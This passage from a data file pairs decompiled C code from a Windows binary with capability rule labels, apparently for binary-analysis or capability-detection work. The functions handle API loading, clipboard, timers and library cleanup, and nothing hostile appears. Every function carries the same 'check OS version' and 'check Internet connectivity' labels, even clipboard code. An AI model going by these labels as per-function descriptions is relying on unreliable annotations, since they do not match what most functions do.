*0x499afc = 0;\n        *0x499b00 = 0;\n        *0x499b04 = 0;\n        *0x499b08 = 0;\n        *0x499b0c = 0;\n        *0x499b10 = 0;\n        *0x499b14 = 0;\n        *0x499b18 = 0;\n        *0x499b1c = 0;\n        *0x499b20 = 0;\n        *0x499b24 = 0;\n        *0x499b28 = 0;\n        *0x499b2c = 0;\n        *0x499b30 = 0;\n        *0x499b34 = 0;\n        *0x499b38 = 0;\n        *0x499b3c = 0;\n        *0x499b40 = 0;\n        *0x499b44 = 0;\n        *0x499b48 = 0;\n        *0x499b4c = 0;\n        *0x499b50 = 0;\n        *0x499b54 = 0;\n        *0x499b58 = 0;\n        *0x499b5c = 0;\n        *0x499b60 = 0;\n        *0x499b64 = 0;\n        *0x499b68 = 0;\n    }\n    *in_FS_OFFSET = iStack20;\n    uStack12 = 0x42f202;\n    iStack16 = 0x42f1fa;\n    fcn.0042eecc();\n    return;\n}\n",
        "token_count": 800
    },
    "0042f204": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.0042f204(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffe6c;\n    int32_t iStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_1h;\n    \n    puStack16 = 0x42f218;\n    fcn.0042eec4();\n    uStack20 = 0x42f5b7;\n    iStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    *0x499b74 = *0x499b74 + 1;\n    puStack16 = &fcn.0042f204::var_1h + 1;\n    if (*0x499b70 == 0) {\n        puStack16 = &fcn.0042f204::var_1h + 1;\n        *0x499b70 = sub.kernel32.dll_LoadLibraryA(0x42f5c8);\n        if (*0x499b70 != 0) {\n            *0x499ab0 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f5d4);\n            *0x499ab4 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f5e4);\n            *0x499ab8 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f5f4);\n            *0x499abc = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f608);\n            *0x499ac0 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f618);\n            *0x499ac4 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f618);\n            *0x499ac8 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f638);\n            *0x499acc = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f64c);\n            *0x499ad0 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f660);\n            *0x499ad4 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f674);\n            *0x499ad8 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f690);\n            *0x499adc = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f6a8);\n            *0x499ae0 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f6b8);\n            *0x499ae4 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f6c8);\n            *0x499ae8 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f6dc);\n            *0x499aec = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f704);\n            *0x499af0 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f714);\n            *0x499af4 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f724);\n            *0x499af8 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f734);\n            *0x499afc = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f744);\n            *0x499b00 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f750);\n            *0x499b04 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f764);\n            *0x499b08 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f778);\n            *0x499b0c = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f788);\n            *0x499b10 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f798);\n            *0x499b14 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f7a8);\n            *0x499b18 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f7b8);\n            *0x499b1c = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f7d0);\n            *0x499b20 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f7e0);\n            *0x499b24 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f7f4);\n            *0x499b28 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f808);\n            *0x499b2c = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f820);\n            *0x499b30 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f830);\n            *0x499b34 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f840);\n            *0x499b38 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f850);\n            *0x499b3c = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f864);\n            *0x499b40 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f874);\n            *0x499b44 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f884);\n            *0x499b48 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f890);\n            *0x499b4c = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f8a0);\n            *0x499b50 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f8bc);\n            *0x499b54 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f8d8);\n            *0x499b58 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f8f0);\n            *0x499b5c = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f908);\n            *0x499b60 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f91c);\n            *0x499b64 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f93c);\n            in_stack_fffffe6c = *0x499b70;\n            *0x499b68 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f958);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffe6c;\n    fcn.0042eecc(0x42f5be);\n    return;\n}\n",
        "token_count": 1744
    },
    "0042f968": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042f968(void)\n\n{\n    int32_t iVar1;\n    \n    if (((*0x499b70 != 0) && (iVar1 = (**0x499b44)(),  iVar1 != 0)) && (iVar1 = (**0x499b40)(),  iVar1 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 87
    },
    "0042f990": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042f990(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42f9d8;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x499b6c = *0x499b6c + 1;\n    if (*0x499b6c == 0) {\n        while (0 < *0x499b74) {\n            fcn.0042f044();\n        }\n        fcn.00404650();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 167
    },
    "0042f9e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042f9e4(void)\n\n{\n    uint uVar1;\n    \n    if (*0x499b90 == NULL) {\n        if (*0x499b8c == 0) {\n            *0x499b8c = sub.kernel32.dll_LoadLibraryA(0x42fa54);\n        }\n        uVar1 = 0x80004001;\n        if (*0x499b8c != 0) {\n            *0x499b90 = sub.kernel32.dll_GetProcAddress_1(*0x499b8c, 0x42fa60);\n            if (*0x499b90 != NULL) {\n                uVar1 = (**0x499b90)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x499b90)();\n    }\n    return uVar1;\n}\n",
        "token_count": 183
    },
    "0042fa80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042fa80(void)\n\n{\n    uint uVar1;\n    \n    if (*0x499b94 == NULL) {\n        if (*0x499b8c == 0) {\n            *0x499b8c = sub.kernel32.dll_LoadLibraryA(0x42faec);\n        }\n        uVar1 = 0x80004001;\n        if (*0x499b8c != 0) {\n            *0x499b94 = sub.kernel32.dll_GetProcAddress_1(*0x499b8c, 0x42faf8);\n            if (*0x499b94 != NULL) {\n                uVar1 = (**0x499b94)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x499b94)();\n    }\n    return uVar1;\n}\n",
        "token_count": 181
    },
    "0042fb10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t __fastcall fcn.0042fb10(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (5 < **0x494958) {\n        iVar1 = fcn.0042fa80();\n        if ((iVar1 == 0) && (param_1 != 0)) {\n            return CONCAT44(param_1, 1);\n        }\n    }\n    return param_1 << 0x20;\n}\n",
        "token_count": 99
    },
    "0042fb34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042fb34(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42fb6f;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x499b88 = *0x499b88 + 1;\n    if ((*0x499b88 == 0) && (*0x499b8c != 0)) {\n        iStack20 = *0x499b8c;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 178
    },
    "00430910": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00430910(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x430969;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x499b9c = *0x499b9c + 1;\n    if (*0x499b9c == 0) {\n        puVar1 = &stack0xfffffffc;\n        if ((*0x499ba4 != '\\0') && (puVar1 = &stack0xfffffffc,  *0x499ba0 != 0)) {\n            iStack20 = *0x499ba0;\n            sub.kernel32.dll_FreeLibrary_1();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.004060f8();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 248
    },
    "00430b84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00430b84(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffcc;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x430c03;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    sub.user32.dll_KillTimer(*(in_EAX + 0x34), 1);\n    if (((*(in_EAX + 0x30) != 0) && (*(in_EAX + 0x40) != '\\0')) && (*(in_EAX + 0x3a) != 0)) {\n        in_stack_ffffffcc = *(in_EAX + 0x34);\n        iVar1 = sub.user32.dll_SetTimer(in_stack_ffffffcc, 1, *(in_EAX + 0x30), 0);\n        if (iVar1 == 0) {\n            fcn.00407550();\n            fcn.0040dafc();\n            fcn.00404ec4();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.00405530(0x430c0a);\n    return;\n}\n",
        "token_count": 303
    },
    "004312a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004312a4(void)\n\n{\n    uchar *puVar1;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x4312f7;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x499bb4 = *0x499bb4 + 1;\n    if (*0x499bb4 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x492334 != 0) {\n            uStack20 = *0x492334;\n            sub.kernel32.dll_GlobalDeleteAtom();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.004060f8();\n    }\n    *in_FS_OFFSET = uStack20;\n    return;\n}\n",
        "token_count": 222
    },
    "004313dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004313dc(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((in_EAX[1] != 0) && (*(in_EAX + 0xd) == '\\0')) {\n        (**(*in_EAX + 0x10))();\n        *(in_EAX + 0xd) = 1;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00431584": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00431584(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint hMem;\n    uint var_4h;\n    \n    uStack20 = 0x431598;\n    (**(*in_EAX + 0x18))();\n    uStack20 = 1;\n    puStack24 = 0x43159f;\n    iVar1 = sub.user32.dll_GetClipboardData();\n    uStack28 = 0x4315f6;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (iVar1 == 0) {\n        iStack36 = 0x4315d1;\n        puStack24 = &stack0xfffffffc;\n        fcn.00405530();\n    }\n    else {\n        puStack24 = &stack0xfffffffc;\n        sub.kernel32.dll_GlobalLock();\n        fcn.00405728();\n        iStack36 = iVar1;\n    }\n    *in_FS_OFFSET = iStack36;\n    uStack28 = 0x4315fd;\n    if (iVar1 != 0) {\n        iStack32 = iVar1;\n        sub.kernel32.dll_GlobalUnlock();\n    }\n    (**(*in_EAX + 0x14))();\n    return;\n}\n",
        "token_count": 327
    },
    "0043181c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043181c(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc8;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_10h;\n    ushort uFormat;\n    uint hMem;\n    int32_t *var_4h;\n    \n    puStack28 = 0x431830;\n    var_4h = in_EAX;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x431891;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.004313dc();\n    var_10h = 0;\n    fcn.004274d4(&fcn.0043181c::var_10h);\n    sub.user32.dll_SetClipboardData(uFormat, hMem);\n    if (var_10h != 0) {\n        in_stack_ffffffc8 = 9;\n        sub.user32.dll_SetClipboardData(9, var_10h);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    (**(*var_4h + 0x14))(0x431898);\n    return;\n}\n",
        "token_count": 292
    },
    "004318a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004318a0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc8;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_10h;\n    ushort uFormat;\n    uint hMem;\n    int32_t *var_4h;\n    \n    puStack28 = 0x4318b4;\n    var_4h = in_EAX;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x431915;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.004313dc();\n    var_10h = 0;\n    (**(*param_2 + 0x60))(&fcn.004318a0::var_10h);\n    sub.user32.dll_SetClipboardData(uFormat, hMem);\n    if (var_10h != 0) {\n        in_stack_ffffffc8 = 9;\n        sub.user32.dll_SetClipboardData(9, var_10h);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    (**(*var_4h + 0x14))(0x43191c);\n    return;\n}\n",
        "token_count": 312
    },
    "00431a7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00431a7c(void)\n\n{\n    if (*0x499bc8 == 0) {\n        *0x499bc8 = fcn.00404620();\n    }\n    return *0x499bc8;\n}\n",
        "token_count": 55
    },
    "00431c98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00431c98(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x499bf4 != NULL) {\n        iVar2 = (**0x499bf4)(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x00431cc4;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00431cc4:\n    return -uVar1;\n}\n",
        "token_count": 151
    },
    "00431ccc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00431ccc(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x499bf8 != NULL) {\n        iVar2 = (**0x499bf8)(arg_8h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x00431cec;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00431cec:\n    return -uVar1;\n}\n",
        "token_count": 119
    },
    "004321d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004321d0(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if ((in_EAX != 0) && ((*(in_EAX + 0x1c) & 0x10) != 0)) {\n        if (*0x499c08 == 0) {\n            *0x499c08 = sub.user32.dll_RegisterWindowMessageA(0x432214);\n        }\n        uVar1 = fcn.00451b4c(0);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 == 100;\n    }\n    return uVar1;\n}\n",
        "token_count": 156
    },
    "00432228": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00432228(void)\n\n{\n    if (*0x499c04 == 0) {\n        *0x499c04 = (**(*0x4923a4 + 4))();\n    }\n    return *0x499c04;\n}\n",
        "token_count": 59
    },
    "004322f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004322f0(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if ((*(in_EAX + 6) != '\\0') && (*(in_EAX + 8 + (param_2 & 0xff) * 4) == 0)) {\n        uVar1 = (***0x49490c)(0, *((param_2 & 0x7f) * 4 + 0x4923ac));\n        *(in_EAX + 8 + (param_2 & 0x7f) * 4) = uVar1;\n    }\n    return *(in_EAX + 8 + (param_2 & 0xff) * 4);\n}\n",
        "token_count": 173
    },
    "00432330": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00432330(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 5) != '\\0') && (*(in_EAX + 6) != '\\0')) && (*(in_EAX + 4) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "00432430": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432430(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_ch == '\\0') || (arg_10h == 0)) {\n        cVar1 = '\\x01';\n    }\n    else {\n        uVar2 = fcn.004322f0(*(arg_10h + 4), *(arg_10h + 8));\n        iVar3 = (***0x4948d4)(uVar2);\n        cVar1 = '\\x01' - (iVar3 == 0);\n    }\n    if (cVar1 != '\\0') {\n        (***0x494ae0)(in_EDX, in_ECX, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "00432a68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00432a68(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 6) != '\\0') {\n        fcn.0043235c();\n    }\n    uVar1 = fcn.0042f968();\n    *(in_EAX + 6) = uVar1;\n    return;\n}\n",
        "token_count": 84
    },
    "00432a84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00432a84(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (in_EAX == 0) {\n        return 0;\n    }\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        fcn.00432228();\n        cVar1 = fcn.00432330();\n        if (cVar1 == '\\0') goto code_r0x00432aa1;\ncode_r0x00432acb:\n        uVar2 = 1;\n    }\n    else {\ncode_r0x00432aa1:\n        if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n            fcn.00432228();\n            cVar1 = fcn.00432330();\n            if ((cVar1 != '\\0') && (cVar1 = fcn.004321d0(),  cVar1 == '\\0')) goto code_r0x00432acb;\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 266
    },
    "00432ad0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00432ad0(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x432b15;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x499c00 = *0x499c00 + 1;\n    if (*0x499c00 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**0x4947e8 == '\\0') {\n            fcn.00404650();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00405530();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 198
    },
    "00433b40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x00433cb1)\n// WARNING: Removing unreachable block (ram,0x00433cbe)\n// WARNING: Removing unreachable block (ram,0x00433ccb)\n// WARNING: Removing unreachable block (ram,0x00433cd1)\n// WARNING: Removing unreachable block (ram,0x00433cde)\n// WARNING: Removing unreachable block (ram,0x00433ce4)\n// WARNING: Removing unreachable block (ram,0x00433cf1)\n\nvoid fcn.00433b40(void)\n\n{\n    uint8_t in_AL;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack28 = &fcn.00433b40::var_2h + 2;\n    uStack32 = 0x433d1f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar1 = in_AL;\n    if (uVar1 < 0x2d) {\n        if (uVar1 - 8 < 2) {\n            puStack28 = &fcn.00433b40::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433cab;\n        }\n        if (uVar1 == 0xd) {\n            puStack28 = &fcn.00433b40::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433cab;\n        }\n        if (uVar1 == 0x1b) {\n            puStack28 = &fcn.00433b40::var_2h + 2;\n            